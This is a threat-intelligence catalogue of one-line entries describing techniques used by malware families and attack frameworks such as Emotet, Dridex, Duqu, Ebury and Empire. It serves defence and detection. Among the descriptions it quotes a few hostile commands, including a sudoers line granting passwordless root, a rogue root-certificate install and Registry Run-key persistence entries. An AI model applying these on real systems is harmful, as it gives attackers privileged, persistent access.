DarkWatchman can query the Registry to determine if it has already been installed on the system.
DarkWatchman has created a scheduled task for persistence.
DarkWatchman can search for anti-virus products on the system.
DarkWatchman can load DLLs.
DarkWatchman has been delivered via spearphishing emails that contain a malicious zip file.
DarkWatchman encodes data using hexadecimal representation before sending it to the C2 server.
DarkWatchman can collect the OS version, system architecture, and computer name.
DarkWatchman can identity the OS locale of a compromised host.
DarkWatchman has collected the username from a victim machine.
DarkWatchman can collect time zone information and system `UPTIME`.
DarkWatchman uses HTTPS for command and control.
DarkWatchman can use `cmd.exe` to execute commands.
DarkWatchman can use WMI to execute commands.
Daserf hides collected data in password-protected .rar archives.
Daserf hides collected data in password-protected .rar archives.
Some Daserf samples were signed with a stolen digital certificate.
Analysis of Daserf has shown that it regularly undergoes technical improvements to evade anti-virus detection.
Daserf can download remote files.
Daserf can log keystrokes.
Daserf leverages Mimikatz and Windows Credential Editor to steal credentials.
Daserf uses file and folder names related to legitimate programs in order to blend in, such as HP, Intel, Adobe, and perflogs.
Daserf uses encrypted Windows APIs and also encrypts data using the alternative base64+RC4 or the Caesar cipher.
Daserf can take screenshots.
A version of Daserf uses the MPRESS packer.
Daserf uses custom base64 encoding to obfuscate HTTP traffic.
Daserf can use steganography to hide malicious code downloaded to the victim.
Daserf uses RC4 encryption to obfuscate HTTP traffic.
Daserf uses HTTP for C2.
Daserf can execute shell commands.
DealersChoice leverages vulnerable versions of Flash to perform execution.
DealersChoice uses HTTP for communication with the C2 server.
DealersChoice makes modifications to open-source scripts from GitHub and executes them on the victim’s machine.
Denis compressed collected data using zlib.
Denis has encoded its PowerShell commands in Base64.
Denis exploits a security vulnerability to load a fake DLL and execute its code.
Denis has used DNS tunneling for C2 communications.
Denis will decrypt important strings used for C&amp;C communication.
Denis has a command to delete files from the victim’s machine.
Denis has several commands to search directories for files.
Denis replaces the nonexistent Windows DLL "msfte.dll" with its own malicious version, which is loaded by the SearchIndexer.exe and SearchProtocolHost.exe.
Denis deploys additional backdoors and hacking tools to the system.
Denis used the &lt;code&gt;IsDebuggerPresent&lt;/code&gt;, &lt;code&gt;OutputDebugString&lt;/code&gt;, and &lt;code&gt;SetLastError&lt;/code&gt; APIs to avoid debugging. Denis used &lt;code&gt;GetProcAddress&lt;/code&gt; and &lt;code&gt;LoadLibrary&lt;/code&gt; to dynamically resolve APIs. Denis also used the &lt;code&gt;Wow64SetThreadContext&lt;/code&gt; API as part of a process hollowing process.
Denis obfuscates its code and encrypts the API names.
Denis has a version written in PowerShell.
Denis performed process hollowing through the API calls CreateRemoteThread, ResumeThread, and Wow64SetThreadContext.
Denis queries the Registry for keys and values.
Denis encodes the data sent to the server in Base64.
Denis ran multiple system checks, looking for processor and register characteristics, to evade emulation and analysis.
Denis collects OS information and the computer name from the victim’s machine.
Denis uses &lt;code&gt;ipconfig&lt;/code&gt; to gather the IP address from the system.
Denis enumerates and collects the username from the victim’s machine.
Denis can launch a remote shell to execute arbitrary commands on the victim’s machine.
Derusbi is capable of performing audio captures.
Derusbi injects itself into the secure shell (SSH) process.
Derusbi uses a backup communication method with an HTTP beacon.
Derusbi is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.
Derusbi is capable of obtaining directory, file, and drive listings.
Derusbi is capable of logging keystrokes.
Derusbi binds to a raw socket on a random source port between 31800 and 31900 for C2.
Derusbi has used unencrypted HTTP on port 443 for C2.
Derusbi collects current and parent process IDs.
Derusbi is capable of enumerating Registry keys and values.
Derusbi variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.
Derusbi is capable of performing screen captures.
Derusbi obfuscates C2 traffic with variable 4-byte XOR keys.
Derusbi gathers the name of the local host, version of GNU Compiler Collection (GCC), and the system information about the CPU, machine, and operating system.
A Linux version of Derusbi checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges. Derusbi also gathers the username of the victim.
The Derusbi malware supports timestomping.
Derusbi is capable of creating a remote Bash shell and executing commands.
Derusbi is capable of capturing video.
Diavol can delete specified files from a targeted system.
Diavol has encrypted files using an RSA key though the `CryptEncrypt` API and has appended filenames with ".lock64".
Diavol can attempt to stop security software.
Diavol has a command to traverse the files and directories in a given path.
Diavol can receive configuration updates and additional payloads including wscpy.exe from C2.
Diavol can delete shadow copies using the `IVssBackupComponents` COM object to call the `DeleteSnapshots` method.
After encryption, Diavol will capture the desktop background window, set the background color to black, and change the desktop wallpaper to a newly created bitmap image with the text “All your files are encrypted! For more information see “README-FOR-DECRYPT.txt".
Diavol has used several API calls like `GetLogicalDriveStrings`, `SleepEx`, `SystemParametersInfoAPI`, `CryptEncrypt`, and others to execute parts of its attack.
Diavol has a `ENMDSKS` command to enumerates available network shares.
Diavol has Base64 encoded the RSA public key used for encrypting files.
Diavol has used `CreateToolhelp32Snapshot`, `Process32First`, and `Process32Next` API calls to enumerate the running processes in the system.
Diavol can use the ARP table to find remote hosts to scan.
Diavol can spread throughout a network via SMB prior to encryption.
Diavol will terminate services using the Service Control Manager (SCM) API.
Diavol has obfuscated its main code routines within bitmap images as part of its anti-analysis techniques.
Diavol can collect the computer name and OS version from the system.
Diavol can enumerate victims' local and external IPs when registering with C2.
Diavol can collect the username from a compromised host.
Diavol has used HTTP GET and POST requests for C2.
Dipsind can download remote files.
Dipsind can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic.
Dipsind encodes C2 traffic with base64.
Dipsind encrypts C2 data with AES256 in ECB mode.
Dipsind uses HTTP for C2.
Dipsind can spawn remote shells.
A Dipsind variant registers as a Winlogon Event Notify DLL to establish persistence.
Disco has achieved initial access and execution through content injection into DNS,  HTTP, and SMB replies to targeted hosts that redirect them to download malicious files.
Disco can use SMB to transfer files.
Disco can download files to targeted systems via SMB.
Disco has been executed through inducing user interaction with malicious .zip and .msi files.
Disco can create a scheduled task to run every minute for persistence.
DnsSystem  can direct queries to custom DNS servers and return C2 commands using TXT records.
DnsSystem can upload files from infected machines after receiving a command with `uploaddd` in the string.
DnsSystem can exfiltrate collected data to its C2 server.
DnsSystem can download files to compromised systems after receiving a command with the string `downloaddd`.
DnsSystem has lured victims into opening macro-enabled Word documents for execution.
DnsSystem can write itself to the Startup folder to gain persistence.
DnsSystem can Base64 encode data sent to C2.
DnsSystem can use the Windows user name to create a unique identification for infected users and systems.
DnsSystem can use `cmd.exe` for execution.
Dok proxies web traffic to potentially monitor and alter victim HTTP(S) traffic.
Dok uses AppleScript to create a login item for persistence.
Dok exfiltrates logs of its execution stored in the &lt;code&gt;/tmp&lt;/code&gt; folder over FTP using the &lt;code&gt;curl&lt;/code&gt; command.
Dok prompts the user for credentials.
Dok installs a root certificate to aid in Adversary-in-the-Middle actions using the command &lt;code&gt;add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/filename&lt;/code&gt;.
Dok installs two LaunchAgents to redirect all network traffic with a randomly generated name for each plist file maintaining the format &lt;code&gt;com.random.name.plist&lt;/code&gt;.
Dok gives all users execute permissions for the application using the command &lt;code&gt;chmod +x /Users/Shared/AppStore.app&lt;/code&gt;.
Dok uses AppleScript to install a login Item by sending Apple events to the &lt;code&gt;System Events&lt;/code&gt; process.
Dok downloads and installs Tor via homebrew.
Dok is packed with an UPX executable packer.
Dok adds &lt;code&gt;admin  ALL=(ALL) NOPASSWD: ALL&lt;/code&gt; to the &lt;code&gt;/etc/sudoers&lt;/code&gt; file.
Doki has used the embedTLS library for network communications.
Doki has used a script that gathers information from a hardcoded list of IP addresses and uploads to an Ngrok URL.
Doki was run through a deployed container.
Doki has used the DynDNS service and a DGA based on the Dogecoin blockchain to generate C2 domains.
Doki’s container was configured to bind the host root directory.
Doki has used Ngrok to establish C2 and exfiltrate data.
Doki was executed through an open Docker daemon API port.
Doki has resolved the path of a process PID to use as a script argument.
Doki has downloaded scripts from C2.
Doki has disguised a file as a Linux kernel module.
Doki has searched for the current process’s PID.
Doki has executed shell scripts with /bin/sh.
Doki has communicated with C2 over HTTPS.
Doki has used the dogechain.info API to generate a C2 address.
Donut can generate shellcode outputs that execute via Ruby.
Donut can patch Antimalware Scan Interface (AMSI), Windows Lockdown Policy (WLDP), as well as exit-related Native API functions to avoid process termination.
Donut can erase file references to payloads in-memory after being reflectively loaded and executed.
Donut can download and execute previously staged shellcode payloads.
Donut can generate shellcode outputs that execute via JavaScript or JScript.
Donut code modules use various API functions to load and inject code.
Donut can generate encrypted, compressed/encoded, or otherwise obfuscated code modules.
Donut can generate shellcode outputs that execute via PowerShell.
Donut includes subprojects that enumerate and identify information about Process Injection candidates.
Donut includes a subproject &lt;code&gt;DonutTest&lt;/code&gt; to inject shellcode into a target process.
Donut can generate shellcode outputs that execute via Python.
Donut can generate code modules that enable in-memory execution of VBScript, JScript, EXE, DLL, and dotNET payloads.
Donut can generate packed code modules.
Donut can generate shellcode outputs that execute via VBScript.
Donut can use HTTP to download previously staged shellcode payloads.
DownPaper uses PowerShell for execution.
DownPaper searches and reads the value of the Windows Update Registry Run key.
DownPaper uses PowerShell to add a Registry Run key in order to establish persistence.
DownPaper collects the victim host name and serial number, and then sends the information to the C2 server.
DownPaper collects the victim username and sends it to the C2 server.
DownPaper communicates to its C2 server over HTTP.
DownPaper uses the command line.
Downdelph bypasses UAC to escalate privileges by using a custom “RedirectEXE” shim database.
Downdelph uses search order hijacking of the Windows executable sysprep.exe to escalate privileges.
After downloading its main config file, Downdelph downloads multiple payloads from C2 servers.
Downdelph inserts pseudo-random characters between each original character during encoding of C2 network requests, making it difficult to write signatures on them.
Downdelph uses RC4 to encrypt C2 responses.
Dridex has encrypted traffic with RSA.
Dridex can perform browser attacks via web injects to steal information such as credentials, certificates, and cookies.
Dridex can abuse legitimate Windows executables to side-load malicious DLL files.
Dridex has relied upon users clicking on a malicious attachment delivered through spearphishing.
Dridex can use multiple layers of proxy servers to hide terminal nodes in its infrastructure.
Dridex has used the &lt;code&gt;OutputDebugStringW&lt;/code&gt; function to avoid malware analysis as part of its anti-debugging technique.
Dridex's strings are obfuscated using RC4.
Dridex contains a backconnect module for tunneling network traffic through a victim's computer. Infected computers become part of a P2P botnet that can relay C2 traffic to other infected peers.
Dridex can use `regsvr32.exe` to initiate malicious code.
Dridex contains a module for VNC.
Dridex can maintain persistence via the creation of scheduled tasks within system directories such as `windows\system32\`, `windows\syswow64,` `winnt\system32`, and `winnt\syswow64`.
Dridex has collected a list of installed software on the system.
Dridex has encrypted traffic with RC4.
Dridex has collected the computer name and OS architecture information from the system.
Dridex has used POST requests and HTTPS for C2 communications.
DropBook can unarchive data downloaded from the C2 to obtain the payload and persistence modules.
DropBook has used legitimate web services to exfiltrate data.
DropBook can collect the names of all files and folders in the Program Files directories.
DropBook can download and execute additional files.
DropBook is a Python-based backdoor compiled with PyInstaller.
DropBook has checked for the presence of Arabic language in the infected machine's settings.
DropBook has checked for the presence of Arabic language in the infected machine's settings.
DropBook can communicate with its operators by exploiting the Simplenote, DropBox, and the social media platform, Facebook, where it can create fake accounts to control the backdoor and receive instructions.
DropBook can execute arbitrary shell commands on the victims' machines.
Drovorub can transfer files from the victim machine.
Drovorub has de-obsfuscated XOR encrypted payloads in WebSocket messages.
Drovorub can exfiltrate files over C2 infrastructure.
Drovorub can delete specific files from a compromised host.
Drovorub can download files to a compromised host.
Drovorub can use a port forwarding rule on its agent module to relay network traffic through the client module to a remote host on the same network.
Drovorub can use kernel modules to establish persistence.
Drovorub can use TCP to communicate between its agent and client modules.
Drovorub has used XOR encrypted payloads in WebSocket client to server messages.
Drovorub has used a kernel module rootkit to hide processes, files, executables, and network artifacts from user space view.
Drovorub can execute arbitrary commands as root on a compromised system.
Drovorub can use the WebSocket protocol and has initiated communication with C2 servers with an HTTP Upgrade request.
Dtrack packs collected data into a password protected archive.
Dtrack’s RAT makes a persistent target file with auto execution on the host start.
Dtrack can retrieve browser history.
Dtrack can collect a variety of information from victim machines.
Dtrack has used a decryption routine that is part of an executable physical patch.
Dtrack has used a dropper that embeds an encrypted payload as extra data.
Dtrack can remove its persistence and delete itself.
Dtrack can list files on available disk volumes.
One of Dtrack can replace the normal flow of a program execution with malicious code.
Dtrack’s can download and upload a file to the victim’s computer.
Dtrack’s dropper contains a keylogging executable.
Dtrack can save collected data to disk, different file formats, and network shares.
One of Dtrack can hide in replicas of legitimate programs like OllyDbg, 7-Zip, and FileZilla.
Dtrack’s dropper can list all running processes.
Dtrack has used process hollowing shellcode to target a predefined list of processes from &lt;code&gt;%SYSTEM32%&lt;/code&gt;.
Dtrack can collect the RegisteredOwner, RegisteredOrganization, and InstallDate registry values.
Dtrack contains a function that calls &lt;code&gt;LoadLibrary&lt;/code&gt; and &lt;code&gt;GetProcAddress&lt;/code&gt;.
Dtrack can collect the victim's computer name, hostname and adapter information to create a unique identifier.
Dtrack can collect the host's IP addresses using the &lt;code&gt;ipconfig&lt;/code&gt; command.
Dtrack can collect network and active connection information.
Dtrack used hard-coded credentials to gain access to a network share.
Dtrack has used &lt;code&gt;cmd.exe&lt;/code&gt; to add a persistent service.
Dtrack can add a service called WBService to establish persistence.
Duqu examines running system processes for tokens that have specific system privileges. If it finds one, it will copy the token and store it for later use. Eventually it will start new processes with the stored token attached. It can also steal tokens to acquire administrative privileges.
Duqu uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.
The discovery modules used with Duqu can collect information on open windows.
Modules can be pushed to and executed by Duqu that copy data to a staging area, compress it, and XOR encrypt it.
Duqu will inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host).
Duqu can be configured to have commands relayed over a peer-to-peer network of infected hosts if some of the hosts do not have Internet access.
Duqu can track key presses with a keylogger module.
The discovery modules used with Duqu can collect information on accounts and permissions.
Modules can be pushed to and executed by Duqu that copy data to a staging area, compress it, and XOR encrypt it.
Duqu has used &lt;code&gt;msiexec&lt;/code&gt; to execute malicious Windows Installer packages. Additionally, a PROPERTY=VALUE pair containing a 56-bit encryption key has been used to decrypt the main payload from the installer packages.
The discovery modules used with Duqu can collect information on process details.
Duqu is capable of loading executable code via process hollowing.
Duqu uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.
Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.
Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.
When the Duqu command and control is operating over HTTP or HTTPS, Duqu uploads data to its controller by appending it to a blank JPG file.
The Duqu command and control protocol's data stream can be encrypted with AES-CBC.
The reconnaissance modules used with Duqu can collect information on network configuration.
The discovery modules used with Duqu can collect information on network connections.
Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.
Duqu creates a new service that loads a malicious driver when the system starts. When Duqu is active, the operating system believes that the driver is legitimate, as it has been signed with a valid private key.
DustySky can compress files via RAR while staging data to be exfiltrated.
DustySky has exfiltrated data to the C2 server.
DustySky has two hard-coded domains for C2 servers; if the first does not respond, it will try the second.
DustySky can delete files it creates from the infected system.
DustySky scans the victim for files that contain certain keywords and document types including PDF, DOC, DOCX, XLS, and XLSX, from a list that is obtained from the C2 as a text file. It can also identify logical drives for the infected machine.
DustySky contains a keylogger.
DustySky searches for network drives and removable media and duplicates itself onto them.
DustySky created folders in temp directories to host collected files before exfiltration.
The DustySky dropper uses a function to obfuscate the name of functions and other parts of the malware.
DustySky can detect connected USB devices.
DustySky collects information about running processes from victims.
DustySky achieves persistence by creating a Registry entry in &lt;code&gt;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;.
DustySky searches for removable media and duplicates itself onto it.
DustySky captures PNG screenshots of the main screen.
DustySky checks for the existence of anti-virus.
DustySky lists all installed software for the infected machine.
DustySky extracts basic information about the operating system.
DustySky has used both HTTP and HTTPS for C2.
The DustySky dropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active.
Dyre decrypts resources needed for targeting the victim.
Dyre injects into other processes to load modules.
Dyre has the ability to send information staged on a compromised host externally to C2.
Dyre has a command to download and executes additional files.
Dyre has the ability to create files in a TEMP folder to act as a database to store information.
Dyre has the ability to directly inject its code into the web browser process.
Dyre has the ability to achieve persistence by adding a new task in the task scheduler to run every minute.
Dyre has the ability to identify installed programs on a compromised host.
Dyre has been delivered with encrypted resources and must be unpacked for execution.
Dyre can detect sandbox analysis environments by inspecting the process list and Registry.
Dyre has the ability to identify the computer name, OS version, and hardware configuration on a compromised host.
Dyre has the ability to identify network settings on a compromised host.
Dyre has the ability to identify the users on a compromised host.
Dyre has the ability to identify running services on a compromised host.
Dyre uses HTTPS for C2 communications.
Dyre registers itself as a service by adding several Registry keys.
ECCENTRICBANDWAGON can delete log files generated from the malware stored at &lt;code&gt;C:\windows\temp\tmp0207&lt;/code&gt;.
ECCENTRICBANDWAGON can capture and store keystrokes.
ECCENTRICBANDWAGON has stored keystrokes and screenshots within the &lt;code&gt;%temp%\GoogleChrome&lt;/code&gt;, &lt;code&gt;%temp%\Downloads&lt;/code&gt;, and &lt;code&gt;%temp%\TrendMicroUpdate&lt;/code&gt; directories.
ECCENTRICBANDWAGON has encrypted strings with RC4.
ECCENTRICBANDWAGON can capture screenshots and store them locally.
ECCENTRICBANDWAGON can use cmd to execute commands on a victim’s machine.
EKANS uses standard encryption library functions to encrypt files.
EKANS stops processes related to security and management software.
EKANS removes backups of Volume Shadow Copies to disable any restoration capabilities.
EKANS has been disguised as &lt;code&gt;update.exe&lt;/code&gt; to appear as a valid executable.
EKANS uses encoded strings in its process kill list.
EKANS looks for processes from a hard-coded list.
EKANS stops database, data backup solution, antivirus, and ICS-related processes.
EKANS can determine the domain of a compromised host.
EKANS can use Windows Mangement Instrumentation (WMI) calls to execute operations.
ELMER is capable of performing directory listings.
ELMER is capable of performing process listings.
ELMER uses HTTP for command and control.
EVILNUM can upload files over the C2 channel from the infected host.
EVILNUM has a function called "DeleteLeftovers" to remove certain artifacts of the attack.
EVILNUM can download and upload files to the victim's computer.
EVILNUM can make modifications to the Regsitry for persistence.
EVILNUM has used a one-way communication method via GitLab and Digital Point to perform C2.
EVILNUM can achieve persistence through the Registry Run key.
EVILNUM can run a remote scriptlet that drops a file and executes it via regsvr32.exe.
EVILNUM can execute commands and scripts through rundll32.
EVILNUM can search for anti-virus products on the system.
EVILNUM can harvest cookies and upload them to the C2 server.
EVILNUM can obtain the computer name from the victim's system.
EVILNUM can obtain the username from the victim's machine.
EVILNUM has changed the creation date of files.
EVILNUM has used the Windows Management Instrumentation (WMI) tool to enumerate infected machines.
Ebury can automatically exfiltrate gathered SSH credentials.
Ebury has installed a self-signed RPM package mimicking the original system package on RPM based systems.
Ebury has been embedded into modified OpenSSH binaries to gain persistent access to SSH credential information.
Ebury has used DNS requests over UDP port 53 for C2.
Ebury has verified C2 domain ownership by decrypting the TXT record using an embedded RSA public key.
Ebury can disable SELinux Role-Based Access Control and deactivate PAM modules.
Ebury has used a DGA to generate a domain name for C2.
Ebury has injected its dynamic library into descendent processes of sshd via LD_PRELOAD.
Ebury can exfiltrate SSH credentials through custom DNS queries.
Ebury has implemented a fallback mechanism to begin using a DGA when the attacker hasn't connected to the infected system for three days.
Ebury can list directory entries.
Ebury can hook logging functions so that nothing from the backdoor gets sent to the logging facility.
Ebury can intercept private keys using a trojanized &lt;code&gt;ssh-add&lt;/code&gt; function.
Ebury has obfuscated its strings with a simple XOR encryption with a static key.
Ebury can deactivate PAM modules to tamper with the sshd configuration.
Ebury has intercepted unencrypted private keys as well as private key pass-phrases.
Ebury has used Python to implement its DGA.
Ebury has used user mode rootkit techniques to remain hidden on the system.
Ebury has encoded C2 traffic in hexadecimal format.
Ebury has encrypted C2 traffic using the client IP address, then encoded it as a hexadecimal string.
Ecipekac has used a valid, legitimate digital signature to evade detection.
Ecipekac can abuse the legitimate application policytool.exe to load a malicious DLL.
Ecipekac has the ability to decrypt fileless loader modules.
Ecipekac can download additional payloads to a compromised host.
Ecipekac can use XOR, AES, and DES to encrypt loader shellcode.
Egregor has used BITSadmin to download and execute malicious DLLs.
Egregor has used DLL side-loading to execute its payload.
Egregor can encrypt all non-system files using a hybrid AES-RSA algorithm prior to displaying a ransom note.
Egregor can collect any files found in the enumerated drivers before sending it to its C2 channel.
Egregor has been decrypted before execution.
Egregor has disabled Windows Defender to evade protections.
Egregor can conduct Active Directory reconnaissance using tools such as Sharphound or AdFind.
Egregor can modify the GPO to evade detection.
Egregor has the ability to download files from its C2 server.
Egregor has masqueraded the svchost.exe process to exfiltrate data.
Egregor has used the Windows API to make detection more difficult.
Egregor has used an encoded PowerShell command by a service created by Cobalt Strike for lateral movement.
Egregor can inject its payload into iexplore.exe process.
Egregor has used regsvr32.exe to execute malicious DLLs.
Egregor has checked for the LogMein event log in an attempt to encrypt files in remote machines.
Egregor has used rundll32 during execution.
Egregor's payloads are custom-packed, archived and encrypted to prevent analysis.
Egregor can perform a language check of the infected system and can query the CPU information (cupid).
Egregor can enumerate all connected drives.
Egregor has used tools to gather information about users.
Egregor contains functionality to query the local/system time.
Egregor can perform a  long sleep (greater than or equal to 3 minutes) to evade detection.
Egregor has used multiple anti-analysis and anti-sandbox techniques to prevent automated analysis by sandboxes.
Egregor has communicated with its C2 servers via HTTPS protocol.
Egregor has used batch files for execution and can launch Internet Explorer from cmd.exe.
Elise injects DLL files into iexplore.exe.
Elise encrypts several of its files, including configuration files.
Elise is capable of launching a remote shell on the host to delete itself.
A variant of Elise executes &lt;code&gt;dir C:\progra~1&lt;/code&gt; when initially run.
Elise can download additional files from the C2 server for execution.
Elise executes &lt;code&gt;net user&lt;/code&gt; after initial communication is made to the remote server.
Elise creates a file in &lt;code&gt;AppData\Local\Microsoft\Windows\Explorer&lt;/code&gt; and stores all harvested data in that file.
If installing itself as a service fails, Elise instead writes itself as a file named svchost.exe saved in %APPDATA%\Microsoft\Network.
Elise enumerates processes via the &lt;code&gt;tasklist&lt;/code&gt; command.
If establishing persistence by installation as a new service fails, one variant of Elise establishes persistence for the created .exe file by setting the following Registry key: &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost : %APPDATA%\Microsoft\Network\svchost.exe&lt;/code&gt;. Other variants have set the following Registry keys for persistence: &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\imejp : [self]&lt;/code&gt; and &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD&lt;/code&gt;.
After copying itself to a DLL file, a variant of Elise calls the DLL file using rundll32.exe.
Elise exfiltrates data using cookie values that are Base64-encoded.
Elise encrypts exfiltrated data with RC4.
Elise executes &lt;code&gt;systeminfo&lt;/code&gt; after initial communication is made to the remote server.
Elise executes &lt;code&gt;ipconfig /all&lt;/code&gt; after initial communication is made to the remote server.
Elise executes &lt;code&gt;net start&lt;/code&gt; after initial communication is made to the remote server.
Elise performs timestomping of a CAB file it creates.
Elise communicates over HTTP or HTTPS for C2.
Elise configures itself as a service.
A variant of Emissary appends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan.
Emissary injects its DLL file into a newly spawned Internet Explorer process.
Variants of Emissary encrypt payloads using various XOR ciphers, as well as a custom algorithm that uses the "srand" and "rand" functions.
Emissary has the capability to execute &lt;code&gt;gpresult&lt;/code&gt;.
Emissary has the capability to download files from the C2 server.
Emissary has the capability to execute the command &lt;code&gt;net localgroup administrators&lt;/code&gt;.
Variants of Emissary have added Run Registry keys to establish persistence.
Variants of Emissary have used rundll32.exe in Registry values added to establish persistence.
The C2 server response to a beacon sent by a variant of Emissary contains a 36-character GUID value that is used as an encryption key for subsequent network communications. Some variants of Emissary use various XOR operations to encrypt C2 data.
Emissary has the capability to execute ver and systeminfo commands.
Emissary has the capability to execute the command &lt;code&gt;ipconfig /all&lt;/code&gt;.
Emissary has the capability to execute the command &lt;code&gt;net start&lt;/code&gt; to interact with services.
Emissary uses HTTP or HTTPS for C2.
Emissary has the capability to create a remote shell and execute specified commands.
Emissary is capable of configuring itself as a service.
Emotet has been observed encrypting the data it collects before sending it to the C2 server.
Emotet is known to use RSA keys for encrypting C2 traffic.
Emotet has obfuscated macros within malicious documents to hide the URLs hosting the malware,  CMD.exe arguments, and PowerShell scripts.
Emotet has been observed leveraging a module that retrieves passwords stored on a system for the current logged-on user.
Emotet has been observed dropping browser password grabber modules.
Emotet has used a self-extracting RAR file to deliver modules to victims. Emotet has also extracted embedded executables from files using hard-coded buffer offsets.
Emotet has been observed injecting in to Explorer.exe and other processes.
Emotet has been observed leveraging a module that can scrape email addresses from Outlook.
Emotet has been observed leveraging a module that can scrape email addresses from Outlook.
Emotet has dropped an embedded executable at `%Temp%\setup.exe`.
Emotet has exfiltrated data over its C2 channel.
Emotet has been seen exploiting SMB via a vulnerability exploit like EternalBlue (MS17-010) to achieve lateral movement and propagation.
Emotet has been observed dropping password grabber modules including Mimikatz.
Emotet has copied itself to remote systems using the `service.exe` filename.
Emotet can brute force a local admin password, then use it to facilitate lateral movement.
Emotet has been observed leveraging a module that scrapes email data from Outlook.
Emotet has relied upon users clicking on a malicious attachment delivered through spearphishing.
Emotet has relied upon users clicking on a malicious link delivered through spearphishing.
Emotet has installed itself as a new service with the service name `Windows Defender System Service` and display name `WinDefService`.
Emotet has used `CreateProcess` to create a new process to run its executable and `WNetEnumResourceW` to enumerate non-hidden shares.
Emotet has enumerated non-hidden network shares using `WNetEnumResourceW`.
Emotet has been observed to hook network APIs to monitor network traffic.
Emotet has used HTTP over ports such as 20, 22, 443, 7080, and 50000, in addition to using ports commonly associated with HTTP/S.
Emotet has been observed using a hard coded list of passwords to brute force user accounts.
Emotet has used Powershell to retrieve the malicious payload and download additional resources like Mimikatz.
Emotet has been observed enumerating local processes.
Emotet has reflectively loaded payloads into memory.
Emotet has been observed adding the downloaded payload to the &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; key to maintain persistence.
Emotet has leveraged the Admin$, C$, and IPC$ shares for lateral movement.
Emotet has maintained persistence through a scheduled task.
Emotet has used custom packers to protect its payloads.
Emotet has been delivered by phishing emails containing attachments.
Emotet has been delivered by phishing emails containing links.
Emotet has used Google’s Protobufs to serialize data sent to and from the C2 server.
Emotet has enumerated all users connected to network shares.
Emotet has the ability to duplicate the user’s token.
Emotet has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads.
Emotet has used HTTP for command and control.
Emotet can extract names of all locally reachable Wi-Fi networks and then perform a brute-force attack to spread to new networks.
Emotet has used cmd.exe to run a PowerShell script.
Emotet has used WMI to execute powershell.exe.
Emotet has been observed creating new services to maintain persistence.
Empire can use PowerSploit's &lt;code&gt;Invoke-TokenManipulation&lt;/code&gt; to manipulate access tokens.
Empire can leverage WMI debugging to remotely replace binaries like sethc.exe, Utilman.exe, and Magnify.exe with cmd.exe.
Empire can ZIP directories on the target system.
Empire can use TLS to encrypt its C2 channel.
Empire can automatically gather the username, domain name, machine name, and other information from a compromised system.
Empire has the ability to automatically send collected data back to the threat actors' C2.
Empire can use Dropbox and GitHub for C2.
Empire has the ability to gather browser data such as bookmarks and visited sites.
Empire includes various modules to attempt to bypass UAC for escalation of privileges.
Empire can harvest clipboard data on both Windows and macOS systems.
Empire has the ability to obfuscate commands using &lt;code&gt;Invoke-Obfuscation&lt;/code&gt;.
Empire uses a command-line interface to interact with systems.
Empire can use &lt;code&gt;Invoke-RunAs&lt;/code&gt; to make tokens.
Empire contains some modules that leverage API hooking to carry out tasks, such as netripper.
Empire can use various modules to search for files containing passwords.
Empire can use modules that extract passwords from common web browsers such as Firefox and Chrome.
Empire contains modules that can discover and exploit various DLL hijacking opportunities.
Empire can utilize &lt;code&gt;Invoke-DCOM&lt;/code&gt; to leverage remote COM execution for lateral movement.
Empire can acquire local and domain user account information.
Empire has a module for creating a new domain user if permissions allow.
Empire has modules for enumerating domain trusts.
Empire has a dylib hijacker module that generates a malicious dylib given the path to a legitimate dylib of a vulnerable application.
Empire can send data gathered from a target through the command and control channel.
Empire can use Dropbox for data exfiltration.
Empire can use GitHub for data exfiltration.
Empire can exploit vulnerabilities such as MS16-032 and MS16-135.
Empire has a limited number of built-in modules for exploiting remote SMB, JBoss, and Jenkins servers.
Empire includes various modules for finding files of interest on hosts and network shares.
Empire can leverage its implementation of Mimikatz to obtain and use golden tickets.
Empire includes various modules for enumerating Group Policy.
Empire can use &lt;code&gt;New-GPOImmediateTask&lt;/code&gt; to modify a GPO that will install and execute a malicious Scheduled Task/Job.
Empire can upload and download to and from a victim machine.
Empire uses PowerSploit's &lt;code&gt;Invoke-Kerberoast&lt;/code&gt; to request service tickets and return crackable ticket hashes.
Empire includes keylogging capabilities for Windows, Linux, and macOS systems.
Empire can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.
Empire contains an implementation of Mimikatz to gather credentials from memory.
Empire can acquire local and domain user account information.
Empire has a module for creating a local user if permissions allow.
Empire has the ability to collect emails on a target system.
Empire can use built-in modules to abuse trusted utilities like MSBuild.exe.
Empire contains a variety of enumeration modules that have an option to use API calls to carry out tasks.
Empire can perform port scans from an infected host.
Empire can find shared drives on the local system.
Empire can be used to conduct packet captures on target hosts.
Empire can perform pass the hash attacks.
Empire contains modules that can discover and exploit path interception opportunities in the PATH environment variable.
Empire contains modules that can discover and exploit search order hijacking vulnerabilities.
Empire contains modules that can discover and exploit unquoted path vulnerabilities.
